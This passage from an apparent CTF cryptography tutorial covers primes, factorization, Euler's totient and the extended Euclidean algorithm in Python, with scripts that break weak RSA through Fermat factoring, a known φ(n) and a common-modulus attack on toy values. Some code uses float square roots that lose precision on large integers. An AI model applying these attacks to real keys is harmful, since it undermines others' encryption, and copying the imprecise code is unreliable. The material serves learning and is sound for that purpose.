        if miller_rabin(p, k=40):
            return p, q

# Generate 512-bit prime
prime = generate_prime(512)
print(f"Generated 512-bit prime:")
print(f"  {prime}")
print(f"  Bit length: {prime.bit_length()}")
print(f"  Is prime: {miller_rabin(prime)}")

# Generate safe prime
safe_prime, sophie_germain = generate_safe_prime(256)
print(f"\nGenerated safe prime:")
print(f"  p = {safe_prime}")
print(f"  q = (p-1)/2 = {sophie_germain}")
print(f"  Both prime: {miller_rabin(safe_prime) and miller_rabin(sophie_germain)}")
```

**Prime Factorization (Small Numbers)**

```python
#!/usr/bin/env python3

def trial_division_factors(n):
    """
    Factor number using trial division
    Returns list of prime factors
    """
    factors = []
    d = 2
    
    while d * d <= n:
        while n % d == 0:
            factors.append(d)
            n //= d
        d += 1
    
    if n > 1:
        factors.append(n)
    
    return factors

def pollard_rho(n):
    """
    Pollard's rho algorithm for factorization
    Probabilistic, efficient for medium-sized composites
    """
    if n % 2 == 0:
        return 2
    
    x, y, d = 2, 2, 1
    f = lambda x: (x * x + 1) % n
    
    while d == 1:
        x = f(x)
        y = f(f(y))
        d = math.gcd(abs(x - y), n)
    
    return d if d != n else None

def factor(n):
    """
    Complete factorization using multiple methods
    """
    if n < 2:
        return []
    if is_prime_deterministic(n):
        return [n]
    
    factors = []
    
    # Try small factors first
    for p in [2, 3, 5, 7, 11, 13]:
        while n % p == 0:
            factors.append(p)
            n //= p
    
    # Use Pollard's rho for remaining composite
    if n > 1:
        if is_prime_deterministic(n):
            factors.append(n)
        else:
            f = pollard_rho(n)
            if f:
                factors.extend(factor(f))
                factors.extend(factor(n // f))
            else:
                factors.append(n)
    
    return sorted(factors)

# Examples
numbers = [60, 1001, 8051, 65537]
for n in numbers:
    print(f"{n} = {' × '.join(map(str, factor(n)))}")
```

**Sieve of Eratosthenes**

```python
#!/usr/bin/env python3

def sieve_of_eratosthenes(limit):
    """
    Generate all primes up to limit
    Time complexity: O(n log log n)
    """
    if limit < 2:
        return []
    
    # Initialize sieve
    is_prime = [True] * (limit + 1)
    is_prime[0] = is_prime[1] = False
    
    # Sieve
    for i in range(2, int(limit**0.5) + 1):
        if is_prime[i]:
            # Mark multiples as composite
            for j in range(i * i, limit + 1, i):
                is_prime[j] = False
    
    # Collect primes
    return [i for i in range(limit + 1) if is_prime[i]]

# Generate primes
primes = sieve_of_eratosthenes(100)
print(f"Primes up to 100: {primes}")
print(f"Count: {len(primes)}")
```

**CTF Application: Factoring Weak RSA Moduli**

```python
#!/usr/bin/env python3

def factor_weak_rsa(n):
    """
    Attempt to factor RSA modulus using various techniques
    """
    print(f"Attempting to factor n = {n}\n")
    
    # Method 1: Check if close to perfect square (Fermat's factorization)
    def fermat_factor(n):
        a = int(n**0.5) + 1
        b2 = a*a - n
        
        for _ in range(10000):
            b = int(b2**0.5)
            if b * b == b2:
                p, q = a + b, a - b
                if p * q == n:
                    return p, q
            a += 1
            b2 = a*a - n
        
        return None, None
    
    p, q = fermat_factor(n)
    if p and q:
        print(f"[+] Fermat's method successful:")
        print(f"    p = {p}")
        print(f"    q = {q}")
        return p, q
    
    # Method 2: Trial division with small primes
    primes = sieve_of_eratosthenes(100000)
    for p in primes:
        if n % p == 0:
            q = n // p
            print(f"[+] Small prime factor found:")
            print(f"    p = {p}")
            print(f"    q = {q}")
            return p, q
    
    # Method 3: Pollard's rho
    p = pollard_rho(n)
    if p and p != n:
        q = n // p
        print(f"[+] Pollard's rho successful:")
        print(f"    p = {p}")
        print(f"    q = {q}")
        return p, q
    
    print("[-] Factorization failed with available methods")
    return None, None

# CTF scenario: weak RSA modulus
import math

# Example 1: Close primes (Fermat's method)
p = 10000000000000000000000000000151
q = 10000000000000000000000000000187
n = p * q
print("Example 1: Close primes")
factor_weak_rsa(n)

print("\n" + "="*50 + "\n")

# Example 2: Small prime factor
p = 1009
q = 999999999999999999999989
n = p * q
print("Example 2: Small prime factor")
factor_weak_rsa(n)
```

**Online Tools Integration**

```bash
# factordb.com API for large number factorization
curl "http://factordb.com/api?query=123456789012345678901234567890"

# Python wrapper for factordb
python3 << 'EOF'
import requests
import json

def factordb_query(n):
    """Query factordb.com for factorization"""
    url = f"http://factordb.com/api?query={n}"
    response = requests.get(url)
    data = json.loads(response.text)
    
    if data['status'] == 'FF':  # Fully factored
        factors = []
        for factor in data['factors']:
            factors.append(int(factor[0]))
        return factors
    return None

# Example
n = 123456789012345678901234567890
factors = factordb_query(n)
if factors:
    print(f"{n} = {' × '.join(map(str, factors))}")
EOF
```

**Important Notes**

- **[Inference]** Miller-Rabin with k=40 rounds provides error probability < 2^(-80), suitable for cryptographic applications
- **Carmichael numbers** (561, 1105, 1729, ...) pass Fermat test but are composite
- **Prime generation timing**: Generating a 2048-bit prime takes ~100-500ms on modern hardware; security-critical applications should use proven implementations
- **[Unverified]** Some implementations use deterministic Miller-Rabin for speed, but this requires careful witness selection based on input size ranges

---

### Euler's Totient Function

Euler's totient function φ(n) counts the number of integers from 1 to n that are coprime to n. This function is fundamental to RSA encryption and the structure of multiplicative groups modulo n.

**Definition and Basic Computation**

```python
#!/usr/bin/env python3
from math import gcd

def phi_naive(n):
    """
    Compute φ(n) by counting coprime integers
    Time complexity: O(n log n)
    Only practical for small n
    """
    if n == 1:
        return 1
    
    count = 0
    for i in range(1, n + 1):
        if gcd(i, n) == 1:
            count += 1
    
    return count

def phi_from_factorization(n, factors=None):
    """
    Compute φ(n) using prime factorization
    φ(n) = n * ∏(1 - 1/p) for all prime divisors p
    Time complexity: O(√n) for factorization
    """
    if factors is None:
        factors = factor(n)
    
    # Get unique prime factors
    unique_primes = list(set(factors))
    
    result = n
    for p in unique_primes:
        result = result * (p - 1) // p
    
    return result

def phi_formula(n):
    """
    Compute φ(n) using the multiplicative property
    If n = p₁^a₁ * p₂^a₂ * ... * pₖ^aₖ
    Then φ(n) = p₁^(a₁-1)(p₁-1) * p₂^(a₂-1)(p₂-1) * ... * pₖ^(aₖ-1)(pₖ-1)
    """
    if n == 1:
        return 1
    
    result = n
    p = 2
    
    while p * p <= n:
        if n % p == 0:
            # Remove factor p
            while n % p == 0:
                n //= p
            
            # Apply formula: result *= (1 - 1/p)
            result -= result // p
        
        p += 1
    
    # If n > 1, then it's a prime factor
    if n > 1:
        result -= result // n
    
    return result

# Examples
test_values = [1, 2, 6, 9, 10, 12, 36, 100]
print("n\tφ(n) naive\tφ(n) formula")
for n in test_values:
    print(f"{n}\t{phi_naive(n)}\t\t{phi_formula(n)}")
```

**Properties of Euler's Totient Function**

```python
#!/usr/bin/env python3

def demonstrate_phi_properties():
    """
    Demonstrate key properties of φ(n)
    """
    
    # Property 1: φ(1) = 1
    assert phi_formula(1) == 1
    print("[✓] φ(1) = 1")
    
    # Property 2: φ(p) = p - 1 for prime p
    primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]
    for p in primes:
        assert phi_formula(p) == p - 1
    print("[✓] φ(p) = p - 1 for all primes p")
    
    # Property 3: φ(p^k) = p^(k-1) * (p - 1)
    test_cases = [(2, 3), (3, 2), (5, 2), (7, 2)]
    for p, k in test_cases:
        n = p ** k
        expected = (p ** (k - 1)) * (p - 1)
        assert phi_formula(n) == expected
    print("[✓] φ(p^k) = p^(k-1) * (p - 1)")
    
    # Property 4: Multiplicative property
    # If gcd(m, n) = 1, then φ(mn) = φ(m) * φ(n)
    pairs = [(3, 5), (7, 11), (4, 9), (8, 15)]
    for m, n in pairs:
        if gcd(m, n) == 1:
            assert phi_formula(m * n) == phi_formula(m) * phi_formula(n)
    print("[✓] φ(mn) = φ(m)φ(n) when gcd(m,n) = 1")
    
    # Property 5: Sum property
    # ∑_{d|n} φ(d) = n
    def divisors(n):
        divs = []
        for i in range(1, int(n**0.5) + 1):
            if n % i == 0:
                divs.append(i)
                if i != n // i:
                    divs.append(n // i)
        return sorted(divs)
    
    for n in [12, 20, 30]:
        divs = divisors(n)
        sum_phi = sum(phi_formula(d) for d in divs)
        assert sum_phi == n
    print("[✓] ∑_{d|n} φ(d) = n")
    
    # Property 6: φ(n) is even for n > 2
    for n in range(3, 50):
        assert phi_formula(n) % 2 == 0
    print("[✓] φ(n) is even for all n > 2")

demonstrate_phi_properties()
```

**Euler's Theorem**

```python
#!/usr/bin/env python3

def verify_eulers_theorem(a, n, verbose=True):
    """
    Verify Euler's Theorem: a^φ(n) ≡ 1 (mod n) when gcd(a, n) = 1
    """
    if gcd(a, n) != 1:
        if verbose:
            print(f"[!] gcd({a}, {n}) ≠ 1, Euler's theorem doesn't apply")
        return False
    
    phi_n = phi_formula(n)
    result = pow(a, phi_n, n)
    
    if verbose:
        print(f"φ({n}) = {phi_n}")
        print(f"{a}^{phi_n} ≡ {result} (mod {n})")
    
    return result == 1

# Examples
print("Verifying Euler's Theorem:")
verify_eulers_theorem(3, 10)
print()
verify_eulers_theorem(7, 20)
print()
verify_eulers_theorem(5, 18)

# Fermat's Little Theorem (special case when n is prime)
def verify_fermats_theorem(a, p):
    """
    Fermat's Little Theorem: a^(p-1) ≡ 1 (mod p) when p is prime and gcd(a,p)=1
    This is a special case of Euler's theorem since φ(p) = p - 1
    """
    if not is_prime_deterministic(p):
        print(f"[!] {p} is not prime")
        return False
    
    if gcd(a, p) != 1:
        print(f"[!] gcd({a}, {p}) ≠ 1")
        return False
    
    result = pow(a, p - 1, p)
    print(f"Fermat's Little Theorem: {a}^{p-1} ≡ {result} (mod {p})")
    return result == 1

print("\nVerifying Fermat's Little Theorem:")
verify_fermats_theorem(2, 13)
verify_fermats_theorem(5, 17)
```

**RSA Key Generation Using φ(n)**

```python
#!/usr/bin/env python3

def generate_rsa_keys(bits=512):
    """
    Generate RSA key pair using Euler's totient function
    
    Returns: (n, e, d) where
        n: modulus (p * q)
        e: public exponent
        d: private exponent (d ≡ e^(-1) mod φ(n))
    """
    # Generate two distinct primes
    p = generate_prime(bits // 2)
    q = generate_prime(bits // 2)
    
    while p == q:
        q = generate_prime(bits // 2)
    
    # Compute modulus
    n = p * q
    
    # Compute Euler's totient
    phi_n = (p - 1) * (q - 1)
    
    # Choose public exponent (commonly 65537)
    e = 65537
    
    # Verify e is coprime with φ(n)
    if gcd(e, phi_n) != 1:
        # Fallback to finding valid e
        e = 3
        while gcd(e, phi_n) != 1:
            e += 2
    
    # Compute private exponent
    d = pow(e, -1, phi_n)
    
    return n, e, d, p, q

def rsa_encrypt(message, e, n):
    """RSA encryption: c ≡ m^e (mod n)"""
    return pow(message, e, n)

def rsa_decrypt(ciphertext, d, n):
    """RSA decryption: m ≡ c^d (mod n)"""
    return pow(ciphertext, d, n)

# Demonstrate RSA
print("Generating RSA keys...")
n, e, d, p, q = generate_rsa_keys(256)

print(f"\nPublic key: (n={n}, e={e})")
print(f"Private key: d={d}")
print(f"\nPrime factors (secret):")
print(f"  p = {p}")
print(f"  q = {q}")
print(f"  φ(n) = (p-1)(q-1) = {(p-1)*(q-1)}")

# Encrypt and decrypt
message = 42
ciphertext = rsa_encrypt(message, e, n)
decrypted = rsa_decrypt(ciphertext, d, n)

print(f"\nEncryption test:")
print(f"  Message: {message}")
print(f"  Ciphertext: {ciphertext}")
print(f"  Decrypted: {decrypted}")
print(f"  Success: {message == decrypted}")
```

**Computing φ(n) Without Factoring (When Structure Known)**

```python
#!/usr/bin/env python3

def phi_for_rsa_modulus(n, hint=None):
    """
    Compute φ(n) for RSA modulus n = pq with various hints
    """
    
    # Scenario 1: Both p and q are known
    if hint and 'p' in hint and 'q' in hint:
        p, q = hint['p'], hint['q']
        phi_n = (p - 1) * (q - 1)
        print(f"[Known p,q] φ(n) = {phi_n}")
        return phi_n
    
    # Scenario 2: p + q is known
    if hint and 'sum' in hint:
        # n = pq, s = p + q
        # φ(n) = n - (p + q) + 1
        s = hint['sum']
        phi_n = n - s + 1
        print(f"[Known p+q={s}] φ(n) = {phi_n}")
        return phi_n
    
    # Scenario 3: p - q is known
    if hint and 'diff' in hint:
        # n = pq, d = |p - q|
        # (p+q)² = (p-q)² + 4pq
        # s = √(d² + 4n)
        d = hint['diff']
        s = int((d**2 + 4*n)**0.5)
        phi_n = n - s + 1
        print(f"[Known |p-q|={d}] φ(n) = {phi_n}")
        return phi_n
    
    # Scenario 4: One prime is known
    if hint and 'p' in hint:
        p = hint['p']
        q = n // p
        phi_n = (p - 1) * (q - 1)
        print(f"[Known p={p}] φ(n) = {phi_n}")
        return phi_n
    
    return None

# Examples
print("Computing φ(n) with various information:")

# Example 1: Both primes known
n = 143
phi_for_rsa_modulus(n, {'p': 11, 'q': 13})

# Example 2: Sum known
n = 143
phi_for_rsa_modulus(n, {'sum': 24})  # 11 + 13 = 24

# Example 3: Difference known
n = 143
phi_for_rsa_modulus(n, {'diff': 2})  # |13 - 11| = 2
```

**CTF Application: Breaking RSA with Known φ(n)**

```python
#!/usr/bin/env python3

def factor_from_phi(n, phi_n):
    """
    Factor n = pq given φ(n)
    
    We know:
        φ(n) = (p-1)(q-1) = pq - p - q + 1 = n - (p+q) + 1
    Therefore:
        p + q = n - φ(n) + 1
    
    Also, p and q are roots of:
        x² - (p+q)x + pq = 0
        x² - sx + n = 0  where s = p+q
    
    Solving: x = (s ± √(s² - 4n)) / 2
    """
    s = n - phi_n + 1  # p + q
    
    # Discriminant
    discriminant = s * s - 4 * n
    
    if discriminant < 0:
        print("[!] Invalid φ(n) - no real roots")
        return None, None
    
    sqrt_discriminant = int(discriminant ** 0.5)
    
    if sqrt_discriminant * sqrt_discriminant != discriminant:
        print("[!] Discriminant is not a perfect square")
        return None, None
    
    p = (s + sqrt_discriminant) // 2
    q = (s - sqrt_discriminant) // 2
    
    # Verify
    if p * q != n:
        print("[!] Factorization verification failed")
        return None, None
    
    return p, q

# CTF Scenario: Given n and φ(n), recover private key
print("CTF Challenge: Given n and φ(n), find p, q, and decrypt")
print("="*60)

n = 9409871297830696483
phi_n = 9409871297821076672
e = 65537
ciphertext = 6253164887454117429

print(f"Given:")
print(f"  n = {n}")
print(f"  φ(n) = {phi_n}")
print(f"  e = {e}")
print(f"  c = {ciphertext}")

# Factor n
print(f"\nFactoring n using φ(n)...")
p, q = factor_from_phi(n, phi_n)

if p and q:
    print(f"  p = {p}")
    print(f"  q = {q}")
    print(f"  Verification: p * q = {p * q}")
    
    # Compute private key
    d = pow(e, -1, phi_n)
    print(f"\nPrivate key:")
    print(f"  d = {d}")
    
    # Decrypt
    plaintext = pow(ciphertext, d, n)
    print(f"\nDecryption:")
    print(f"  m = {plaintext}")
    
    # Try to convert to text
    try:
        plaintext_bytes = plaintext.to_bytes((plaintext.bit_length() + 7) // 8, 'big')
        print(f"  Text: {plaintext_bytes}")
    except:
        pass
```

**Carmichael's Lambda Function**

```python
#!/usr/bin/env python3

def carmichael_lambda(n):
    """
    Compute Carmichael's lambda function λ(n)
    
    λ(n) is the exponent of the multiplicative group (Z/nZ)*
    For RSA, can use λ(n) instead of φ(n) for smaller private keys
    
    Properties:
        λ(p^k) = φ(p^k) = p^(k-1)(p-1) for odd prime p
        λ(2^k) = 2^(k-2) for k ≥ 3
        λ(n) = lcm(λ(p₁^a₁), λ(p₂^a₂), ...) for n = p₁^a₁ * p₂^a₂ * ...
    """
    from math import gcd
    
    def lcm(a, b):
        return abs(a * b) // gcd(a, b)
    
    if n == 1:
        return 1
    
    # Factor n
    factors = {}
    temp_n = n
    d = 2
    
    while d * d <= temp_n:
        while temp_n % d == 0:
            factors[d] = factors.get(d, 0) + 1
            temp_n //= d
        d += 1
    
    if temp_n > 1:
        factors[temp_n] = factors.get(temp_n, 0) + 1
    
    # Compute λ for each prime power
    lambda_values = []
    
    for p, k in factors.items():
        if p == 2:
            if k == 1:
                lambda_p = 1
            elif k == 2:
                lambda_p = 2
            else:
                lambda_p = 2 ** (k - 2)
        else:
            lambda_p = (p ** (k - 1)) * (p - 1)
        
        lambda_values.append(lambda_p)
    
    # Compute LCM of all λ values
    result = lambda_values[0]
    for lam in lambda_values[1:]:
        result = lcm(result, lam)
    
    return result

# Compare φ(n) and λ(n)
print("Comparing φ(n) and λ(n):")
print("n\tφ(n)\tλ(n)")
for n in [6, 8, 12, 15, 20, 35, 143]:
    phi_n = phi_formula(n)
    lambda_n = carmichael_lambda(n)
    print(f"{n}\t{phi_n}\t{lambda_n}")

# For RSA modulus n = pq
print("\nFor RSA modulus n = pq:")
p, q = 1009, 1013
n = p * q
phi_n = (p - 1) * (q - 1)
lambda_n = carmichael_lambda(n)

print(f"p = {p}, q = {q}")
print(f"n = {n}")
print(f"φ(n) = {phi_n}")
print(f"λ(n) = {lambda_n}")
print(f"λ(n) divides φ(n): {phi_n % lambda_n == 0}")

# Both work for RSA
e = 65537
d_phi = pow(e, -1, phi_n)
d_lambda = pow(e, -1, lambda_n)

print(f"\nPrivate exponents:")
print(f"d (using φ) = {d_phi}")
print(f"d (using λ) = {d_lambda}")

# Test both work
m = 12345
c = pow(m, e, n)
m1 = pow(c, d_phi, n)
m2 = pow(c, d_lambda, n)

print(f"\nDecryption test:")
print(f"Both work: {m == m1 == m2}")
```

**Efficient Computation for Large Numbers**

```python
#!/usr/bin/env python3

def phi_large_with_known_factors(prime_factors):
    """
    Efficiently compute φ(n) when prime factorization is known
    Input: list of (prime, exponent) tuples
    """
    result = 1
    
    for p, k in prime_factors:
        # φ(p^k) = p^(k-1) * (p-1)
        result *= (p ** (k - 1)) * (p - 1)
    
    return result

# Example with large number
prime_factors = [(2, 3), (3, 2), (5, 1), (7, 1)]
n = 1
for p, k in prime_factors:
    n *= p ** k

phi_n = phi_large_with_known_factors(prime_factors)
print(f"n = {n}")
print(f"φ(n) = {phi_n}")
print(f"Verification: {phi_n == phi_formula(n)}")
```

---

### Extended Euclidean Algorithm

The Extended Euclidean Algorithm (EEA) computes the greatest common divisor (GCD) of two integers and finds coefficients (Bézout coefficients) x and y such that ax + by = gcd(a, b). This is essential for computing modular inverses in cryptography.

**Basic Euclidean Algorithm**

```python
#!/usr/bin/env python3

def gcd_euclidean(a, b, verbose=False):
    """
    Compute GCD using Euclidean algorithm
    Based on: gcd(a, b) = gcd(b, a mod b)
    """
    if verbose:
        print(f"Computing gcd({a}, {b}):")
    
    while b != 0:
        if verbose:
            print(f"  gcd({a}, {b}) = gcd({b}, {a % b})")
        a, b = b, a % b
    
    if verbose:
        print(f"  Result: {a}\n")
    
    return a

# Examples
print("Euclidean Algorithm:")
gcd_euclidean(48, 18, verbose=True)
gcd_euclidean(270, 192, verbose=True)
```

**Extended Euclidean Algorithm**

```python
#!/usr/bin/env python3

def extended_gcd(a, b):
    """
    Extended Euclidean Algorithm
    
    Returns: (gcd, x, y) such that ax + by = gcd(a, b)
    """
    if b == 0:
        return a, 1, 0
    
    gcd, x1, y1 = extended_gcd(b, a % b)
    
    x = y1
    y = x1 - (a // b) * y1
    
    return gcd, x, y

def extended_gcd_iterative(a, b):
    """
    Iterative version of Extended Euclidean Algorithm
    More efficient for large numbers
    """
    old_r, r = a, b
    old_s, s = 1, 0
    old_t, t = 0, 1
    
    while r != 0:
        quotient = old_r // r
        old_r, r = r, old_r - quotient * r
        old_s, s = s, old_s - quotient * s
        old_t, t = t, old_t - quotient * t
    
    return old_r, old_s, old_t

# Examples
print("Extended Euclidean Algorithm:")
a, b = 240, 46
gcd, x, y = extended_gcd(a, b)
print(f"gcd({a}, {b}) = {gcd}")
print(f"Bézout coefficients: x = {x}, y = {y}")
print(f"Verification: {a}*{x} + {b}*{y} = {a*x + b*y}")

print()

a, b = 35, 15
gcd, x, y = extended_gcd_iterative(a, b)
print(f"gcd({a}, {b}) = {gcd}")
print(f"Bézout coefficients: x = {x}, y = {y}")
print(f"Verification: {a}*{x} + {b}*{y} = {a*x + b*y}")
```

**Detailed Trace of Extended GCD**

```python
#!/usr/bin/env python3

def extended_gcd_verbose(a, b):
    """
    Extended GCD with detailed trace
    """
    print(f"Computing Extended GCD of {a} and {b}:\n")
    print(f"{'Step':<6}{'a':<8}{'b':<8}{'q':<6}{'r':<8}{'x':<8}{'y':<8}")
    print("="*54)
    
    steps = []
    old_r, r = a, b
    old_s, s = 1, 0
    old_t, t = 0, 1
    step = 0
    
    while r != 0:
        quotient = old_r // r
        remainder = old_r % r
        
        steps.append({
            'step': step,
            'a': old_r,
            'b': r,
            'q': quotient,
            'r': remainder,
            'x': old_s,
            'y': old_t
        })
        
        print(f"{step:<6}{old_r:<8}{r:<8}{quotient:<6}{remainder:<8}{old_s:<8}{old_t:<8}")
        
        old_r, r = r, remainder
        old_s, s = s, old_s - quotient * s
        old_t, t = t, old_t - quotient * t
        step += 1
    
    print(f"{step:<6}{old_r:<8}{0:<8}{'-':<6}{'-':<8}{old_s:<8}{old_t:<8}")
    print("="*54)
    print(f"\nResult: gcd = {old_r}, x = {old_s}, y = {old_t}")
    print(f"Verification: {a}×{old_s} + {b}×{old_t} = {a*old_s + b*old_t}\n")
    
    return old_r, old_s, old_t

# Example
extended_gcd_verbose(240, 46)
```

**Computing Modular Inverse Using EEA**

```python
#!/usr/bin/env python3

def mod_inverse_eea(a, n):
    """
    Compute modular inverse a^(-1) mod n using Extended Euclidean Algorithm
    
    From ax + ny = gcd(a, n):
    If gcd(a, n) = 1, then ax ≡ 1 (mod n)
    Therefore, a^(-1) ≡ x (mod n)
    """
    gcd, x, y = extended_gcd(a, n)
    
    if gcd != 1:
        return None  # Inverse doesn't exist
    
    # Make sure x is positive
    return (x % n + n) % n

# Examples
print("Computing Modular Inverses:")
test_cases = [(7, 26), (3, 11), (15, 26), (5, 17)]

for a, n in test_cases:
    inv = mod_inverse_eea(a, n)
    if inv:
        print(f"{a}^(-1) ≡ {inv} (mod {n})")
        print(f"  Verification: {a} × {inv} ≡ {(a * inv) % n} (mod {n})")
    else:
        print(f"{a}^(-1) mod {n} doesn't exist (gcd({a}, {n}) = {gcd_euclidean(a, n, False)})")
    print()
```

**Solving Linear Diophantine Equations**

```python
#!/usr/bin/env python3

def solve_diophantine(a, b, c):
    """
    Solve linear Diophantine equation: ax + by = c
    
    Returns: (x0, y0, gcd) where (x0, y0) is one solution
             or (None, None, gcd) if no solution exists
    
    General solution: x = x0 + (b/gcd)t, y = y0 - (a/gcd)t for integer t
    """
    gcd, x0, y0 = extended_gcd(a, b)
    
    if c % gcd != 0:
        return None, None, gcd  # No solution
    
    # Scale the solution
    factor = c // gcd
    x0 *= factor
    y0 *= factor
    
    return x0, y0, gcd

def all_solutions_in_range(a, b, c, x_min, x_max):
    """
    Find all integer solutions to ax + by = c where x_min ≤ x ≤ x_max
    """
    x0, y0, gcd = solve_diophantine(a, b, c)
    
    if x0 is None:
        return []
    
    solutions = []
    b_gcd = b // gcd
    a_gcd = a // gcd
    
    # Find range of t values
    t_min = (x_min - x0 + b_gcd - 1) // b_gcd  # Ceiling division
    t_max = (x_max - x0) // b_gcd  # Floor division
    
    for t in range(t_min, t_max + 1):
        x = x0 + b_gcd * t
        y = y0 - a_gcd * t
        if x_min <= x <= x_max:
            solutions.append((x, y))
    
    return solutions

# Examples
print("Solving Linear Diophantine Equations:\n")

# Example 1: 3x + 5y = 11
a, b, c = 3, 5, 11
x0, y0, gcd = solve_diophantine(a, b, c)
if x0 is not None:
    print(f"{a}x + {b}y = {c}")
    print(f"  One solution: x = {x0}, y = {y0}")
    print(f"  Verification: {a}×{x0} + {b}×{y0} = {a*x0 + b*y0}")
    print(f"  General solution: x = {x0} + {b//gcd}t, y = {y0} - {a//gcd}t")
    
    # Find solutions in range
    solutions = all_solutions_in_range(a, b, c, 0, 20)
    print(f"  Solutions with 0 ≤ x ≤ 20:")
    for x, y in solutions[:5]:  # Show first 5
        print(f"    (x={x}, y={y})")
    print()

# Example 2: No solution case
a, b, c = 6, 9, 10
x0, y0, gcd = solve_diophantine(a, b, c)
if x0 is None:
    print(f"{a}x + {b}y = {c}")
    print(f"  No solution (gcd({a}, {b}) = {gcd} does not divide {c})\n")

# Example 3: Chicken McNugget problem
# Find which numbers cannot be represented as 6x + 9y + 20z with x, y, z ≥ 0

# First solve for combinations of two terms
print("Application: Frobenius Number")
print("Can we buy exactly 43 McNuggets with boxes of 6, 9, and 20?")

target = 43
found = False

for z in range(target // 20 + 1):
    remainder = target - 20 * z
    if remainder < 0:
        break

    # Solve 6x + 9y = remainder
    x0, y0, gcd = solve_diophantine(6, 9, remainder)
    if x0 is not None:
        # Find non-negative solutions
        sols = all_solutions_in_range(6, 9, remainder, 0, remainder // 6 + 1)
        for x, y in sols:
            if x >= 0 and y >= 0:
                print(f"  Yes: {x}×6 + {y}×9 + {z}×20 = {6*x + 9*y + 20*z}")
                found = True
                break
    if found:
        break

if not found:
    print(f"  No: Cannot represent {target}")
````

**Solving Modular Equations Using EEA**

```python
#!/usr/bin/env python3

def solve_modular_equation(a, b, n):
    """
    Solve: ax ≡ b (mod n)
    
    Using Extended GCD to find all solutions
    """
    gcd, x0, _ = extended_gcd(a, n)
    
    if b % gcd != 0:
        return []  # No solution
    
    # Reduce to simpler equation
    a_reduced = a // gcd
    b_reduced = b // gcd
    n_reduced = n // gcd
    
    # Find one solution
    gcd_reduced, x_base, _ = extended_gcd(a_reduced, n_reduced)
    x0 = (x_base * b_reduced) % n_reduced
    
    # All solutions: x = x0 + k*(n/gcd) for k = 0, 1, ..., gcd-1
    solutions = [(x0 + k * n_reduced) % n for k in range(gcd)]
    
    return sorted(solutions)

# Examples
print("Solving Modular Equations:\n")

test_equations = [
    (3, 6, 9),    # Multiple solutions
    (5, 11, 17),  # Unique solution
    (6, 5, 9),    # No solution
    (4, 6, 10),   # Multiple solutions
]

for a, b, n in test_equations:
    print(f"Solve: {a}x ≡ {b} (mod {n})")
    solutions = solve_modular_equation(a, b, n)
    
    if solutions:
        print(f"  Solutions: {solutions}")
        for x in solutions:
            result = (a * x) % n
            print(f"    x = {x}: {a}×{x} ≡ {result} (mod {n}) ✓")
    else:
        gcd_val = gcd_euclidean(a, n, False)
        print(f"  No solution (gcd({a}, {n}) = {gcd_val} does not divide {b})")
    print()
````

**CTF Application: Breaking Weak RSA**

```python
#!/usr/bin/env python3

def break_rsa_with_common_modulus(n, e1, e2, c1, c2):
    """
    Common modulus attack on RSA
    If same message encrypted with two different exponents sharing modulus:
        c1 = m^e1 mod n
        c2 = m^e2 mod n
    
    If gcd(e1, e2) = 1, we can recover m using Extended GCD
    """
    # Find Bézout coefficients: e1*x + e2*y = 1
    gcd, x, y = extended_gcd(e1, e2)
    
    if gcd != 1:
        print(f"[!] Attack requires gcd(e1, e2) = 1, but got {gcd}")
        return None
    
    print(f"Bézout coefficients: {e1}×{x} + {e2}×{y} = {gcd}")
    
    # Compute m = c1^x * c2^y mod n
    # Handle negative exponents
    if x < 0:
        c1 = pow(c1, -1, n)
        x = -x
    if y < 0:
        c2 = pow(c2, -1, n)
        y = -y
    
    m = (pow(c1, x, n) * pow(c2, y, n)) % n
    
    return m

# CTF Scenario
print("CTF Challenge: Common Modulus Attack")
print("="*60)

# Setup (simulating challenge data)
n = 25777  # Small for demonstration
e1, e2 = 7, 11
m = 1337  # Secret message (flag)

c1 = pow(m, e1, n)
c2 = pow(m, e2, n)

print(f"Given:")
print(f"  n = {n}")
print(f"  e1 = {e1}, c1 = {c1}")
print(f"  e2 = {e2}, c2 = {c2}")
print(f"\nAttacking...")

recovered_m = break_rsa_with_common_modulus(n, e1, e2, c1, c2)

if recovered_m:
    print(f"\nRecovered message: {recovered_m}")
    print(f"Original message: {m}")
    print(f"Success: {recovered_m == m}")
    
    # Try to decode as text
    try:
        text = recovered_m.to_bytes((recovered_m.bit_length() + 7) // 8, 'big')
        print(f"As text: {text}")
    except:
        pass
```

**Computing Multiple Inverses Efficiently**

```python
#!/usr/bin/env python3

def batch_mod_inverse(numbers, modulus):
    """
    Compute modular inverses of multiple numbers efficiently
    Uses Montgomery's trick to reduce number of modular inversions
    
    Time complexity: O(n) + 1 modular inversion
    vs. O(n) modular inversions naively
    """
    n = len(numbers)
    
    # Compute prefix products
    prefix = [1] * (n + 1)
    for i in range(n):
        prefix[i + 1] = (prefix[i] * numbers[i]) % modulus
    
    # Compute inverse of product
    inv_product = pow(prefix[n], -1, modulus)
    
    # Compute individual inverses
    inverses = [0] * n
    for i in range(n - 1, -1, -1):
        inverses[i] = (inv_product * prefix[i]) % modulus
        inv_product = (inv_product * numbers[i]) % modulus
    
    return inverses

# Example
numbers = [3, 5, 7, 11, 13]
modulus = 17

print("Batch Modular Inverse Computation:")
print(f"Numbers: {numbers}")
print(f"Modulus: {modulus}\n")

inverses = batch_mod_inverse(numbers, modulus)

for num, inv in zip(numbers, inverses):
    print(f"{num}^(-1) ≡ {inv} (mod {modulus})")
    print(f"  Verification: {num} × {inv} ≡ {(num * inv) % modulus} (mod {modulus})")
```

**Binary Extended GCD (Optimized)**

```python
#!/usr/bin/env python3

def binary_gcd(a, b):
    """
    Binary GCD algorithm (Stein's algorithm)
    More efficient than Euclidean algorithm on binary computers
    Uses only subtraction and bit shifts (no division)
    """
    if a == 0:
        return b
    if b == 0:
        return a
    
    # Count common factors of 2
    shift = 0
    while ((a | b) & 1) == 0:
        a >>= 1
        b >>= 1
        shift += 1
    
    # Remove remaining factors of 2 from a
    while (a & 1) == 0:
        a >>= 1
    
    while b != 0:
        # Remove factors of 2 from b
        while (b & 1) == 0:
            b >>= 1
        
        # Ensure a ≤ b
        if a > b:
            a, b = b, a
        
        b -= a
    
    return a << shift

# Compare performance (conceptually)
import time

a, b = 1234567890, 9876543210

start = time.time()
gcd1 = gcd_euclidean(a, b)
time1 = time.time() - start

start = time.time()
gcd2 = binary_gcd(a, b)
time2 = time.time() - start

print(f"Euclidean GCD: {gcd1} (time: {time1:.6f}s)")
print(f"Binary GCD: {gcd2} (time: {time2:.6f}s)")
print(f"Results match: {gcd1 == gcd2}")
```

**Important Notes**

